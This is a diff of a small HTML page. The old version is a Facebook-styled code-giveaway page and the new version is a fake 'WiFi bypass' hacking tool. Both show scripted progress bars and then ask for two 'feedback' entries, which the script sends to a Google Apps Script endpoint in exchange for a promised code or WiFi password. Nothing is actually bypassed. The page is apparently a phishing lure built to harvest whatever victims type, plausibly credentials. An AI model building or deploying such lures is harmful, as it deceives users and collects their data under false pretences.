@@ -1,157 +1,118 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Search Page</title>
-
+<title>WiFi System</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body{
   margin:0;
-  font-family: Helvetica, Arial, sans-serif;
-  background:#f0f2f5;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
+  background:black;
+  color:#00ff00;
+  font-family:monospace;
 }
-
-.box{
-  background:#fff;
-  width:360px;
-  padding:20px;
-  border-radius:8px;
-  box-shadow:0 2px 10px rgba(0,0,0,.15);
-  text-align:center;
+.screen{
+  padding:16px;
+  animation:fade .5s ease;
 }
-
-/* Facebook-like input */
-.fb-input{
+@keyframes fade{from{opacity:0}to{opacity:1}}
+input,button{
   width:100%;
-  height:44px;
-  padding:0 12px;
-  font-size:15px;
-  border-radius:6px;
-  border:1px solid #ccd0d5;
-  margin:10px 0;
-}
-
-button{
-  width:100%;
-  height:44px;
-  border:none;
-  border-radius:6px;
-  background:#1877f2;
-  color:#fff;
-  font-size:15px;
-  cursor:pointer;
-}
-
-.link{
-  color:#1877f2;
-  margin-top:10px;
-  cursor:pointer;
-  font-size:14px;
-}
-
-.hidden{display:none}
-
-/* Loading */
-.loading{
-  width:100%;
-  background:#ddd;
-  border-radius:6px;
-  overflow:hidden;
+  padding:12px;
+  margin:6px 0;
+  background:black;
+  color:#00ff00;
+  border:1px solid #00ff00;
 }
 .bar{
-  height:20px;
-  width:0%;
-  background:#1877f2;
+  height:10px;
+  border:1px solid #00ff00;
+  margin-top:10px;
 }
+.fill{
+  height:100%;
+  width:0%;
+  background:#00ff00;
+  transition:width .1s linear;
+}
+.hidden{display:none}
 </style>
 </head>
-
 <body>
 
-<!-- PAGE 1 SEARCH -->
-<div class="box" id="page1">
-  <h3>Search</h3>
-  <div class="loading"><div class="bar" id="bar"></div></div>
-  <p id="percent">0%</p>
-</div>
-
-<!-- PAGE 2 ENTER CODE -->
-<div class="box hidden" id="codePage">
-  <h3>Enter Code</h3>
-  <input class="fb-input" placeholder="Enter Code">
-  <button>Submit</button>
-  <div class="link" onclick="getCode()">Don't have a Code? Get Code</div>
-</div>
-
-<!-- FEEDBACK 1 -->
-<div class="box hidden" id="fb1">
-  <h3>Feedback</h3>
-  <input class="fb-input" id="f1" placeholder="Enter feedback">
-  <button onclick="sendF1()">Send</button>
-</div>
-
-<!-- FEEDBACK 2 -->
-<div class="box hidden" id="fb2">
-  <h3>More Feedback</h3>
-  <input class="fb-input" id="f2" placeholder="Enter feedback">
-  <button onclick="sendF2()">Send</button>
-</div>
-
-<!-- CODE SHOW -->
-<div class="box hidden" id="codeShow">
-  <h2>CODE</h2>
-  <h1>5864</h1>
-  <button onclick="copyCode()">COPY</button>
-  <div class="link" onclick="backMain()">Back to main</div>
-</div>
+<div id="app"></div>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxPZco9av6RzXCesIXIByfVHRHdhhqmDD8_UaeAb6R1akmK9jPhCvQrRZpRqy47bqUCPw/exec";
+const API_URL = "https://script.google.com/macros/s/AKfycbzWMtu51OSnKm6VYvAZPeL-vGPIXhjF-lBHHsvIJNvbVtIv9S_5XV4BnQH9PGl3Sxh10w/exec";
+const app = document.getElementById("app");
 
-/* LOADING 11 SECONDS */
-let p=0;
-let loading=setInterval(()=>{
-  p++;
-  bar.style.width=p+"%";
-  percent.innerText=p+"%";
-  if(p>=100){
-    clearInterval(loading);
-    page1.classList.add("hidden");
-    codePage.classList.remove("hidden");
-  }
-},110); // ≈11 seconds
-
-function getCode(){
-  codePage.classList.add("hidden");
-  fb1.classList.remove("hidden");
+function render(html){
+  app.innerHTML = `<div class="screen">${html}</div>`;
 }
 
-function sendF1(){
-  const v=document.getElementById("f1").value;
-  fetch(WEB_APP_URL+"?step=1&feedback="+encodeURIComponent(v));
-  fb1.classList.add("hidden");
-  fb2.classList.remove("hidden");
+function progress(sec, done){
+  const bar = document.querySelector(".fill");
+  let p=0;
+  const i=setInterval(()=>{
+    p+=100/(sec*10);
+    bar.style.width=p+"%";
+    if(p>=100){
+      clearInterval(i);
+      done();
+    }
+  },100);
 }
 
-function sendF2(){
-  const v=document.getElementById("f2").value;
-  fetch(WEB_APP_URL+"?step=2&feedback="+encodeURIComponent(v));
-  fb2.classList.add("hidden");
-  codeShow.classList.remove("hidden");
+render(`
+<h3>ENTER WIFI NAME</h3>
+<input id="wifi">
+<button onclick="scan1()">BYPASS</button>
+`);
+
+function scan1(){
+  render(`
+<h3>Scanning...</h3>
+<div class="bar"><div class="fill"></div></div>
+`);
+  progress(15, chooseType);
 }
 
-function copyCode(){
-  navigator.clipboard.writeText("5864");
-  alert("Code Copied");
+function chooseType(){
+  render(`
+<h3>WHAT KIND OF WIFI?</h3>
+<button onclick="scan2()">PRIVATE WIFI</button>
+<button onclick="scan2()">PUBLIC WIFI</button>
+`);
 }
 
-function backMain(){
-  codeShow.classList.add("hidden");
-  codePage.classList.remove("hidden");
+function scan2(){
+  render(`
+<h3>Bypassing Security...</h3>
+<div class="bar"><div class="fill"></div></div>
+`);
+  progress(15, feedbackForm);
+}
+
+function feedbackForm(){
+  render(`
+<h3>FEEDBACK</h3>
+<p>Send feedback to get the password</p>
+<input id="f1" placeholder="Feedback 1">
+<input id="f2" placeholder="Feedback 2">
+<button onclick="submitFeedback()">SUBMIT</button>
+`);
+}
+
+function submitFeedback(){
+  fetch(API_URL,{
+    method:"POST",
+    body:JSON.stringify({
+      feedback1:document.getElementById("f1").value,
+      feedback2:document.getElementById("f2").value
+    })
+  }).then(()=>{
+    render(`<h3>PROCESSING COMPLETE</h3><p>Access Granted</p>`);
+  });
 }
 </script>
 
